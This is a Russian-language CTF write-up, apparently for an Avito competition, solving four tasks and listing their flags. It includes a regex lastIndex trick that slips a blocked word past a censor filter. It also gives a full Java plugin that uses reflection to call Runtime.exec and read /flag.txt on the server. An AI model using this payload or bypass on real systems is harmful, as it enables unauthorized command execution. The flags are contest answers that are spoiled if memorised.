## Первые шаги
При старте делаем скрин всех звездочек, открываем скрин на втором мониторе и спокойно проходим 3 этапа.

flag: `avito{7h3_34r1y_b33_g37s_7h3_h0n3y}`

## Незваный гоуст
Открываем картинку в пэинте и обводим все границы(глазкам больно). После разукрашивание узнаем флаг. (первую букву подскзаал разраб, как оказалось это не 8)

![[ghost_screenshot_solved.png]]

flag: SM4RT3R TH4N AI 

## На мьюте
В `filter.js` видим, что регулярка используется с флагом g(сохраняет индекс последнего совпадения).
```
function getPolicy(sessionId) {
  if (!policies.has(sessionId)) {
    policies.set(sessionId, {
      id: sessionId,
      re: new RegExp(
        `(?:${BLOCKED_WORDS.join('|')})(?=[\\s.,!?;:)}\\]"'»]|$)`,
        'gi',
      ),
    });
  }
  return policies.get(sessionId);
}
```
Значит мы можем найти вхождение в текстах из списка BLOCKED_WORDS, зацензурить их и после команда `/original 4` пройдет проверку.
В самом 4 тексте, есть заблокированное слово "Тише":
```
[Бридж]
Тише гудит улей, дамп почти на руках,
Я слышу, как щёлкает шифр, рассыпаясь в прах.
Ещё один слой - и решётка сдалась,
Я роюсь до самого дна, не моргнув ни раз.
```
Выделяем его и отправляем `/censor 868 872`, после спокойно вводим `/original 4`

flag: avito{REg3X_FOr_51lENCE_5l4SH_g_FOR_V1oLENc3}

## B2Bee
```java
package aboba;  
  
import java.lang.reflect.Method;  
import java.util.Scanner;  
import java.lang.reflect.Constructor;  
import ru.avitoctf.marketplugins.api.DiscountPlugin;  
import ru.avitoctf.marketplugins.api.PluginContext;  
import ru.avitoctf.marketplugins.model.PluginResult;  
  
public class aboba implements DiscountPlugin {  
   @Override  
   public PluginResult apply(PluginContext context) {  
       String result = "";  
       try {  
           Class<?> runtimeClass = Class.forName("java.lang.Runtime");  
           Method getRuntimeMethod = runtimeClass.getMethod("getRuntime");  
           Object runtimeInstance = getRuntimeMethod.invoke(null);  
           Method execMethod = runtimeClass.getMethod("exec", String.class);  
           Object processInstance = execMethod.invoke(runtimeInstance, "cat /flag.txt");  
  
           Class<?> processClass = Class.forName("java.lang.Process");  
           Method getInputStreamMethod = processClass.getMethod("getInputStream");  
           Object inputStreamInstance = getInputStreamMethod.invoke(processInstance);  
              
           Constructor<?> scannerConstructor = Class.forName("java.util.Scanner")  
                   .getConstructor(Class.forName("java.io.InputStream"));  
           Object scannerInstance = scannerConstructor.newInstance(inputStreamInstance);  
              
           Scanner scanner = (Scanner) scannerInstance;  
           scanner.useDelimiter("\\A");  
           result = scanner.hasNext() ? scanner.next() : "";  
           scanner.close();  
       } catch (Exception e) {  
           result = "Error: " + e.getMessage();  
       }  
       return new PluginResult(0, 0, result);  
   }  
}
```

flag: avito{juSt_34sy_b1g_d1ScOUN7}
